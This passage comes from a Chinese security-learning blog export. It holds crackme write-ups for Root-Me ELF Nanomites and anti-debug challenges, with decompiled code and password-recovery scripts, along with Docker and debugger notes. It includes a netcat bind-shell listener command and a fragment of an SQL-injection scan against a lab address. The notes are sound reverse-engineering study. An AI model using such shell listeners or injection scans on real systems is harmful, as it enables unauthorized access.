<h4 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h4><p>Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.</p>
<hr>
<p>netcat<br>nc -lvnp 443 监听模式 443 外来请求</p>
<hr>
<h4 id="ollydbg"><a href="#ollydbg" class="headerlink" title="ollydbg"></a>ollydbg</h4><p>显示当前EIP *<br>执行到光标位置 F4<br>F2 断点<br>CALL 把接下来的地址先压入栈<br>win 压入参数逆序 f(a,b) 先压b 后 a<br>test = and 不改变操作数值</p>
<h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h4><p>file test.py</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2019/03/15/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>sudo add-apt-repository <br>   “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu">https://download.docker.com/linux/ubuntu</a> <br>   $(lsb_release -cs) <br>   stable”</p>
<p><a href="https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/">https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/</a></p>
<a id="more"></a>

<p>配置完镜像源后，记得重启</p>
<p>/bin/sh<br>/bin/bash<br>运行shell</p>
<p>docker run –name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=”123456” -d mysql:5.7</p>
<p>docker run -p 8888:5000 –name myfirstapp YOUR_USERNAME/myfirstapp</p>
<ul>
<li>Running on <a href="http://0.0.0.0:5000/">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)</li>
</ul>
<p> docker rm <code>docker ps -a -q</code></p>
<p> docker rmi <code>docker images -q</code></p>
<p> docker run -p 4000:80 –name py-http6 –link mariadb:mysql finsenty/http5</p>
<p> mysql.connecter 查询后面带一个，</p>
<p> -u “<a href="http://192.168.160.1/sqltest/post.php&quot;">http://192.168.160.1/sqltest/post.php&quot;</a> –forms</p>
<p> docker run -d -p 4000:80 –link mysql:mysql –name http6 finsenty/http5</p>
<p>docker build -t finsenty/http5 .</p>
]]></content>
  </entry>
  <entry>
    <title>ELF x64 - Nanomites - Introduction_WP</title>
    <url>/2020/10/31/ELF%20x64%20-%20Nanomites%20-%20Introduction_WP/</url>
    <content><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction-WP"><a href="#ELF-x64-Nanomites-Introduction-WP" class="headerlink" title="ELF x64 - Nanomites - Introduction_WP"></a>ELF x64 - Nanomites - Introduction_WP</h2><p>这是运用了<code>Debug Blocker</code>技术的题目<br>又花了些时间，终于破解了</p>
<h3 id="gdb-设置跟踪父进程还是子进程"><a href="#gdb-设置跟踪父进程还是子进程" class="headerlink" title="gdb  设置跟踪父进程还是子进程"></a>gdb  设置跟踪父进程还是子进程</h3><p><code>set follow-fork-mode parrent|child</code><br>当发生fork时，指示调试器执行父进程还是子进程</p>
<h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>在程序执行到<code>int3</code>时，就会触发 <code>SIGTRAP </code>信号，</p>
<a id="more"></a>
<pre><code> long ptrace(enum __ptrace_request request,
             pid_t pid,
             void *addr,
             void *data);</code></pre>
<p>参数data：作用则根据request的不同而变化，如果需要向目标进程中写入数据，data存放的是需要写入的数据；如果从目标进程中读数据，data将存放返回的数据</p>
<h3 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h3><p>可以先用strace来观察在系统调用<br><code>strace -i ./ch28.bin</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[00007fa5f9b6bf4e] <span class="built_in">read</span>(0, toto  /输入值</span><br><span class="line"><span class="string">&quot;toto\n&quot;</span>, 1024) = 5</span><br><span class="line">[00007fa5f9b75c22] mmap(NULL, 321, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fa5f9c8e000</span><br><span class="line">[00007fa5f9b4857b] <span class="built_in">clone</span>(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fa5f9c43810) = 131358</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=131358, si_uid=1000, si_status=SIGTRAP, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_GETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_SETREGS, 131358, NULL, 0x7fff0dde4900) = 0</span><br><span class="line">[00007fa5f9b7329a] ptrace(PTRACE_CONT, 131358, NULL, 0) = 0</span><br><span class="line">[00007fa5f9b48286] wait4(131358, [&#123;WIFEXITED(s) &amp;&amp; WEXITSTATUS(s) == 1&#125;], 0, NULL) = 131358</span><br><span class="line">[00007fa5f9b48286] --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131358, si_uid=1000, si_status=1, si_utime=0, si_stime=0&#125; ---</span><br><span class="line">[00007fa5f9b48286] wait4(131358, 0x7fff0dde4a1c, 0, NULL) = -1 ECHILD (No child processes)</span><br><span class="line">[00007fa5f9b6bff3] write(1, <span class="string">&quot;Wrong! try hard! :)\n&quot;</span>, 20Wrong! try hard! :)</span><br><span class="line">) = 20</span><br><span class="line">[00007fa5f9b6c087] lseek(0, -1, SEEK_CUR) = -1 ESPIPE (Illegal seek)</span><br><span class="line">[00007fa5f9b48759] exit_group(0)        = ?</span><br><span class="line">[????????????????] +++ exited with 0 +++</span><br></pre></td></tr></table></figure>
<p>当我输入值‘toto’，触发了两次 SIGTRAP，之后退出</p>
<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>直接IDA PRO反编译<br>其他的细节都不管，就看我们需要的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400871</span><span class="params">(__int64 input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">__pid_t</span> pid; <span class="comment">// [rsp+104h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  dest = mmap(<span class="number">0L</span>L, <span class="number">0x141</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);   <span class="comment">// 0x7ffff7ffb000</span></span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, <span class="number">0x8D</span>uLL);                   <span class="comment">// src == 0x601080 指向400ac0( 0x48</span></span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )                                   <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;So you want to trace me?!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = dest;</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(__int64))dest)(input);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)stat_loc == <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )               <span class="comment">// 0x57f &gt;&gt;8 =0x5</span></span><br><span class="line">        sub_400736((__int64)dest, pid);</span><br><span class="line">      ptrace(PTRACE_CONT, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)pid, <span class="number">0L</span>L, <span class="number">0L</span>L);  <span class="comment">//表示继续执行子进程</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong! try hard! :)&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;POOOOOOOOOOOOOOOOOOOOOOOOO God damn!! You won!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>子进程会执行 memcpy()h函数复制到<code>dest</code>的代码，<code>src == 0x601080</code> 指向<code>400ac0</code>，所以实际复制的是<code>400ac0</code>处的指令。</p>
<p><a href="https://imgchr.com/i/BUFlQK"><img src="https://s1.ax1x.com/2020/10/31/BUFlQK.jpg" alt="BUFlQK.jpg"></a></p>
<p><code>RDI </code>保存着我们输入的数据，每次读取一个字节，存入<code>al</code>，之后<code>int3</code>,就会触发SIGTRAP，父进程进行调试子进程。</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400736</span><span class="params">(__int64 dest, <span class="keyword">unsigned</span> <span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+10h] [rbp-F0h] 0x7fffffffdc00 ==RAX 子进程寄存器值放在这里</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+90h] [rbp-70h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+A0h] [rbp-60h] 0x400a30 有问题</span></span><br><span class="line">  __int64 dest_1; <span class="comment">// [rsp+F0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [rsp+FFh] [rbp-1h]</span></span><br><span class="line">                                                <span class="comment">// 0x20cf9 子进程pid</span></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  dest_1 = dest + <span class="number">1</span>;                            <span class="comment">// dest + 1</span></span><br><span class="line">  result = ptrace(PTRACE_GETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 获取值所有寄存器值？？</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )                   <span class="comment">// 13个int 3</span></span><br><span class="line">  &#123;                                             <span class="comment">// rbp-0x8 = i</span></span><br><span class="line">    result = seg_6010A0[<span class="number">3</span> * i];</span><br><span class="line">    <span class="keyword">if</span> ( v5 - dest_1 == result )                <span class="comment">// v5 = 0x7ffff7ffb00c </span></span><br><span class="line">                                                <span class="comment">// c-1 = b ==11</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v9++ + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( seg_6010A0[<span class="number">3</span> * i + <span class="number">1</span> + i % <span class="number">2</span>] == v4 )<span class="comment">// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50</span></span><br><span class="line">          v6 |= <span class="number">0x40</span>uLL;                        <span class="comment">// 修改了V6 0x7fffffffdc90 第十八个 表示EFLAGS</span></span><br><span class="line">                                                <span class="comment">// 之前 rax 处 程序 JE zf=0 才不跳转 如果跳转则程序结束</span></span><br><span class="line">        result = ptrace(PTRACE_SETREGS, pid, <span class="number">0L</span>L, &amp;v3);<span class="comment">// 设置值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hummmmmmm NO WAY.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">42</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> <code>ptrace(PTRACE_GETREGS, pid, 0LL, &amp;v3)</code>获取所有子进程寄存器值，存放在V3地址处。</p>
<p><code> if ( seg_6010A0[3 * i + 1 + i % 2] == v4 )</code>// v4 == input 表示输入值放在子进程r9中  0x7fffffffdc50<br>这条语句就是我们需要的，其将我们的输入值与<code>6010A0</code>处的值进行比较，如果相等，则修改V6，也就是EFLAGS，<code>将ZF置1</code>，<code>JNE不跳转</code>，如果跳转了直接结束进程。</p>
<p><code>ptrace(PTRACE_SETREGS, pid, 0LL, &amp;v3)</code>将修改后的寄存器值重新赋给子进程</p>
<hr>
<p>从<code>if</code>知道，比较共进行13次，下面编写python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=[]</span><br><span class="line">flag=[]</span><br><span class="line">print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ch28.txt&#x27;</span>,<span class="string">&#x27;rt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span>(line.find(<span class="string">&#x27;db&#x27;</span>)!=<span class="number">-1</span>):</span><br><span class="line">            pos=line.find(<span class="string">&#x27;db&#x27;</span>)</span><br><span class="line">            item=line[pos+<span class="number">4</span>:pos+<span class="number">6</span>]</span><br><span class="line">            data.append(<span class="built_in">int</span>(item,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    print(<span class="built_in">format</span>(i,<span class="string">&#x27;x&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    flag.append(data[<span class="number">3</span>*i+<span class="number">1</span>+i%<span class="number">2</span>])</span><br><span class="line">print(<span class="string">&#x27;1111111111111111111111111111&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure>
<p>ch28.txt保存<code>6010A0</code>开始的数据。</p>
<p><a href="https://imgchr.com/i/BUkHu8"><img src="https://s1.ax1x.com/2020/10/31/BUkHu8.jpg" alt="BUkHu8.jpg"></a><br>运行得到flag</p>
<p>make -n 显示命令，但不执行</p>
<hr>
<h3 id="大佬代码"><a href="#大佬代码" class="headerlink" title="大佬代码"></a>大佬代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;start_with_anything&quot;</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;file ./ch28.bin&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;br *0x40080d&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span> + <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">  <span class="comment"># Continue to last character</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> password:</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span> gdb.error:</span><br><span class="line">    <span class="comment"># If info reg fails it is probably because the program has exited.</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line">  password += <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Password found is :&quot;</span>+password)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;quit&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="论文-想法"><a href="#论文-想法" class="headerlink" title="论文 想法"></a>论文 想法</h3><p>云攻击</p>
<p>让VM支持去重，然后flush+reload</p>
<p>建立cpu cache的随机策略<br>映射</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF x86 - Anti-debug</title>
    <url>/2020/10/23/ELF%20x86%20-%20Anti-debug/</url>
    <content><![CDATA[<h2 id="ELF-x86-Anti-debug"><a href="#ELF-x86-Anti-debug" class="headerlink" title="ELF x86 - Anti-debug"></a>ELF x86 - Anti-debug</h2><p>参考<a href="https://re.kv.io/crackme/12.html">https://re.kv.io/crackme/12.html</a><br><code>int 80</code> 系统调用<br><code>32位</code>下，<code>EAX</code>保存调用号<br><del>mov eax , 30  utime, utimes - change file last access and modification times<br>int utime(const char *filename, const struct utimbuf *times);</del></p>
<p><del>The utime() system call changes the access and modification times of<br>the inode specified by filename to the actime and modtime fields of<br>times respectively.</del></p>
<a id="more"></a>
<hr>
<p>上面是错的<br>0x30 as sys_signal 十六进制 <code>直接弄错</code><br>0x30 == 48</p>
<pre><code>void (*signal(int sig, void (*func)(int)))(int)</code></pre>
<p><code>sys_signal</code>设置一个函数来处理信号，即<strong>带有 sig 参数的信号处理程序</strong><br><code>sig </code>– 在信号处理程序中作为变量使用的信号码<br><code>0x5</code> ==<code>SIGABRT</code>    (Signal Abort) 程序异常终止。<br><code>func</code> – 一个指向函数的指针。它可以是一个由程序定义的函数</p>
<hr>
<p><code>int3</code> would cause a debugger to stop</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">08048063</span> loc_8048063:                            ; CODE XREF: start↑j</span><br><span class="line">.text:<span class="number">08048063</span>                 mov     eax, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">08048068</span>                 mov     ebx, <span class="number">5</span></span><br><span class="line">.text:<span class="number">0804806</span>D                 mov     ecx, offset sub_80480E2</span><br><span class="line">.text:<span class="number">08048072</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_signal</span><br><span class="line">.text:<span class="number">08048074</span>                 jmp     <span class="keyword">short</span> loc_8048077</span><br><span class="line">.text:<span class="number">08048074</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048076</span>                 db <span class="number">0</span>CEh</span><br><span class="line">.text:<span class="number">08048077</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048077</span></span><br><span class="line">.text:<span class="number">08048077</span> loc_8048077:                            ; CODE XREF: start+<span class="number">14</span>↑j</span><br><span class="line">.text:<span class="number">08048077</span>                 <span class="keyword">int</span>     <span class="number">3</span>               ; Trap to Debugger</span><br><span class="line">.text:<span class="number">08048078</span>                 jmp     <span class="keyword">short</span> loc_804807B</span><br></pre></td></tr></table></figure>
<p>先设置第一个signal处理函数，在<code>0x08048077</code>处遇到<code>int 3</code>跳到处理函数</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">080480E2</span></span><br><span class="line">.text:<span class="number">080480E2</span> sub_80480E2     proc near               ; DATA XREF: start+D↑o</span><br><span class="line">.text:<span class="number">080480E2</span>                 mov     eax, offset sub_8048104</span><br><span class="line">.text:<span class="number">080480E7</span>                 jmp     <span class="keyword">short</span> loc_8048101</span><br><span class="line">.text:<span class="number">080480E9</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480E9</span></span><br><span class="line">.text:<span class="number">080480E9</span> loc_80480E9:                            ; CODE XREF: sub_80480E2:loc_80480FF↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                                         ; sub_80480E2:loc_8048101↓j</span><br><span class="line">.text:<span class="number">080480E9</span>                 cmp     eax, <span class="number">80482E8</span>h</span><br><span class="line">.text:<span class="number">080480</span>EE                 jz      <span class="keyword">short</span> locret_8048103</span><br><span class="line">.text:<span class="number">080480F</span>0                 jmp     <span class="keyword">short</span> loc_80480F3</span><br><span class="line">.text:<span class="number">080480F</span>0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>2                 db <span class="number">0E8</span>h</span><br><span class="line">.text:<span class="number">080480F</span>3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>3</span><br><span class="line">.text:<span class="number">080480F</span>3 loc_80480F3:                            ; CODE XREF: sub_80480E2+E↑j</span><br><span class="line">.text:<span class="number">080480F</span>3                 <span class="keyword">xor</span>     dword ptr [eax], <span class="number">8048F</span>C1h</span><br><span class="line">.text:<span class="number">080480F</span>9                 add     eax, <span class="number">4</span></span><br><span class="line">.text:<span class="number">080480F</span>C                 jmp     <span class="keyword">short</span> loc_80480FF</span><br><span class="line">.text:<span class="number">080480F</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>E                 db <span class="number">0</span>EBh</span><br><span class="line">.text:<span class="number">080480F</span>F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">080480F</span>F</span><br><span class="line">.text:<span class="number">080480F</span>F loc_80480FF:                            ; CODE XREF: sub_80480E2+<span class="number">1</span>A↑j</span><br><span class="line">.text:<span class="number">080480F</span>F                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048101</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048101</span></span><br><span class="line">.text:<span class="number">08048101</span> loc_8048101:                            ; CODE XREF: sub_80480E2+<span class="number">5</span>↑j</span><br><span class="line">.text:<span class="number">08048101</span>                 jmp     <span class="keyword">short</span> loc_80480E9</span><br><span class="line">.text:<span class="number">08048103</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048103</span></span><br><span class="line">.text:<span class="number">08048103</span> locret_8048103:                         ; CODE XREF: sub_80480E2+C↑j</span><br><span class="line">.text:<span class="number">08048103</span>                 retn</span><br><span class="line">.text:<span class="number">08048103</span> sub_80480E2     endp</span><br></pre></td></tr></table></figure>
<p>将代码解密出来，然后后面根据signal执行处理代码</p>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &#x27;</span>.join(<span class="built_in">map</span>(lambda i: chr(i ^ <span class="number">0xfc</span>), [<span class="number">0xA5</span>, <span class="number">0xCF</span>, <span class="number">0x9D</span>, <span class="number">0xB4</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x95</span>, <span class="number">0xAF</span>, <span class="number">0x88</span>, <span class="number">0xB4</span>, <span class="number">0xCF</span>, <span class="number">0x97</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xDD</span>]))</span><br></pre></td></tr></table></figure>
<p><code>&#39; &#39;</code>字符串内置函数<code>join()</code><br><code>map(fun, iter) </code>函数fun操作iter<br>第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。<br><code>lambda</code> 声明为匿名函数，如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span>(lambda x: x ** <span class="number">2</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="r2（一个大佬的解法）"><a href="#r2（一个大佬的解法）" class="headerlink" title="r2（一个大佬的解法）"></a><code>r2</code>（一个大佬的解法）</h3><p><code>oo+</code>          reopen in read-write<br><code>wox 0xfc @ entry0+625!18</code>  //会写入 将0xfc与后面18个值异或<br>wox [val]                     ^=  xor  (f.ex: wox 0x90)<br><code>ps @ entry0+625</code><br>ps       print string</p>
<hr>
<p><code>wa nop </code>          write nopcode using asm.arch and asm.bits</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x0804060</span>]&gt; wa nop @ <span class="number">0x08048077</span></span><br><span class="line">[<span class="number">0x0804060</span>]&gt; wa mov ecx, <span class="number">0x80482d1</span> @ <span class="number">0x08048167</span></span><br></pre></td></tr></table></figure>
<p>控制程序流程</p>
<hr>
<h3 id="sys-write-−"><a href="#sys-write-−" class="headerlink" title="sys_write −"></a>sys_write −</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov	edx,<span class="number">4</span>		; message length</span><br><span class="line">mov	ecx,msg		; message to write</span><br><span class="line">mov	ebx,<span class="number">1</span>		; <span class="function">file <span class="title">descriptor</span> <span class="params">(<span class="built_in">stdout</span>)</span></span></span><br><span class="line">mov	eax,4		; system call number (sys_write)</span><br><span class="line"><span class="keyword">int</span>	<span class="number">0x80</span>		; call kernel</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF_x64_Nanomites_Introduction</title>
    <url>/2020/10/26/ELF_x64_Nanomites_Introduction/</url>
    <content><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction"><a href="#ELF-x64-Nanomites-Introduction" class="headerlink" title="ELF x64 - Nanomites - Introduction"></a>ELF x64 - Nanomites - Introduction</h2><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><del>mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。</del></p>
<pre><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></pre>
<a id="more"></a>
<p>在虚拟地址空间中为所调用进程创建一个新的映射。开始地址为addr，长度为length<br>内核在靠近页边界的地方，尝试创建。如果已有映射在此，就不用addr，会返回新地址</p>
<p>The contents of a <code>file mapping </code>(as opposed to an anonymous mapping;<br>       see MAP_ANONYMOUS below), are initialized using <code>length bytes s</code>tarting<br>       at <code>offset </code>offset in the file (or other object) referred to by the<br>       <code>file descriptor</code> fd. </p>
<hr>
<p><code>prot</code>参数描述所需的内存保护</p>
<p> The <code>flags</code> argument determines whether updates to the mapping are<br>       visible to other processes mapping the same region, and whether<br>       updates are carried through to the underlying file.</p>
<p>mmap 在虚拟空间中开辟一段空间，当要读的时候，将文件内容加载进物理内存</p>
<hr>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><pre><code>void * memcpy ( void * destination, const void * source, size_t num );</code></pre>
<p>表示将0x400ac0的141个字节拷贝到新开辟的虚拟空间中0x7ffff7ffb000</p>
<p>0x4008b6:    mov    rcx,QWORD PTR [rip+0x2007c3]        # 0x601080<br>rcx==0x3148c93148c03148</p>
<hr>
